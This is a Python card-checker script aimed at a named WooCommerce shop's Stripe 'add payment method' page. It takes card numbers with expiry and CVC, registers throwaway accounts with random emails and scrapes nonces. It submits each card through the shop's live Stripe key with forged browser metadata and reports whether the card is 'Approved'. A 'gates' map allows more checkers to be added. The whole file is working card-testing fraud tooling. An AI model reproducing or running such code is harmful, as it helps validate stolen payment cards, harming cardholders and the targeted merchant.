import time
import random
import requests
import re
import string
from typing import Optional, Dict

BASE_URL = "https://mashaplans.com"
REGISTER_PAGE = f"{BASE_URL}/my-account/"
ADD_PAYMENT_PAGE = f"{REGISTER_PAGE}add-payment-method/"
ADMIN_AJAX = f"{BASE_URL}/wp-admin/admin-ajax.php"
payment_endpoint = "https://api.stripe.com/v1/payment_methods"

STRIPE_PK = "pk_live_51HoW0zKWbuTous5nlnogb9XRodenm4shgJ452V1FNCXsO3tDzpBnzy9JBDTUuf0styRxx7LIAhF9284USOfnHLEl00vRpIOsWP"

class StripeProcessor:
    def __init__(self, cc):
        self.session_manager = requests.Session()
        self.processing_timestamp = int(time.time())
        cc = cc.strip()
        n, mm, yy, cvc = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
        self.card_data = {
            "card_number": n,
            "expiration_month": mm,
            "expiration_year": yy,
            "security_code": cvc
        }

    def _generate_secure_identifier(self):
        random_chars = ''.join(random.choices(string.ascii_lowercase, k=20))
        return f"{random_chars}Losha@gmail.com"

    def _create_request_headers(self):
        return {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en,ar;q=0.9,en-US;q=0.8'
        }

    def _extract_nonce_value(self, html, pattern):
        match_result = re.search(pattern, html)
        return match_result.group(1) if match_result else None

    def _execute_user_registration(self):
        initial_response = self.session_manager.get(ADD_PAYMENT_PAGE, headers=self._create_request_headers())
        registration_nonce = self._extract_nonce_value(initial_response.text, r'name="woocommerce-register-nonce" value="(.*?)"')
        if not registration_nonce:
            return False
        user_email = self._generate_secure_identifier()
        registration_data = {
            'email': user_email,
            'password': 'Losha' + user_email,
            'wc_order_attribution_session_entry': ADD_PAYMENT_PAGE,
            'wc_order_attribution_session_start_time': self.processing_timestamp,
            'wc_order_attribution_user_agent': self._create_request_headers()['User-Agent'],
            'woocommerce-register-nonce': registration_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        registration_response = self.session_manager.post(REGISTER_PAGE, params={'action': 'register'}, data=registration_data, headers=self._create_request_headers())
        return registration_response.status_code == 200

    def _retrieve_payment_nonce(self):
        payment_page_response = self.session_manager.get(ADD_PAYMENT_PAGE, headers=self._create_request_headers())
        return self._extract_nonce_value(payment_page_response.text, r'"createAndConfirmSetupIntentNonce":"(.*?)"')

    def _create_payment_method(self):
        payload = {
            'type': "card",
            'card[number]': self.card_data['card_number'],
            'card[cvc]': self.card_data['security_code'],
            'card[exp_year]': self.card_data['expiration_year'],
            'card[exp_month]': self.card_data['expiration_month'],
            'allow_redisplay': "unspecified",
            'billing_details[address][country]': "IQ",
            'payment_user_agent': "stripe.js/5127fc55bb; stripe-js-v3/5127fc55bb; payment-element; deferred-intent",
            'referrer': BASE_URL,
            'time_on_page': str(random.randint(40000, 50000)),
            'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}",
            'client_attribution_metadata[merchant_integration_source]': "elements",
            'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
            'client_attribution_metadata[merchant_integration_version]': "2021",
            'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
            'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
            'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}",
            'key': STRIPE_PK
        }
        headers = {
            'User-Agent': self._create_request_headers()['User-Agent'],
            'Accept': "application/json",
            'origin': "https://js.stripe.com",
            'referer': "https://js.stripe.com/",
        }
        response = self.session_manager.post(payment_endpoint, data=payload, headers=headers)
        return response.json().get('id')

    def _create_setup_intent(self, payment_method_id, setup_nonce):
        payload = {
            'action': "wc_stripe_create_and_confirm_setup_intent",
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': "card",
            '_ajax_nonce': setup_nonce
        }
        headers = {
            'User-Agent': self._create_request_headers()['User-Agent'],
            'x-requested-with': "XMLHttpRequest",
            'origin': BASE_URL,
            'referer': ADD_PAYMENT_PAGE,
        }
        response = self.session_manager.post(ADMIN_AJAX, data=payload, headers=headers)
        return response.json()

    def process_payment_authorization(self):
        if not self.card_data: return "Invalid Card Information"
        if not self._execute_user_registration(): return "User Registration Failed"
        payment_nonce = self._retrieve_payment_nonce()
        if not payment_nonce: return "Payment Nonce Retrieval Failed"
        payment_method_id = self._create_payment_method()
        if not payment_method_id: return "Payment Method Creation Failed"
        setup_result = self._create_setup_intent(payment_method_id, payment_nonce)
        if not setup_result: return "Setup Intent Creation Failed"
        if setup_result.get('success') == True:
            return "Approved"
        else:
            error_data = setup_result.get('data', {}).get('error', {})
            return error_data.get('message', 'Processing Error')

# ======================================================
# نظام الـ Map لدعم أكثر من دالة
# ======================================================

def str1(cc):
    try:
        processor = StripeProcessor(cc)
        return processor.process_payment_authorization()
    except Exception as e:
        return f"Error: {e}"

# Map containing functions
GATES_MAP = {
    "Stripe_V1": str1,
    # يمكنك إضافة دوال أخرى هنا مستقبلاً
    # "Stripe_V2": str2,
}

def check(card):
    # اختيار دالة عشوائية من الـ Map
    gate_name, gate_func = random.choice(list(GATES_MAP.items()))
    result = gate_func(card)
    # نرجع النتيجة واسم الدالة واسم دالة التنفيذ لاستخدامه في الرسالة
    return result, gate_name, gate_func.__name__
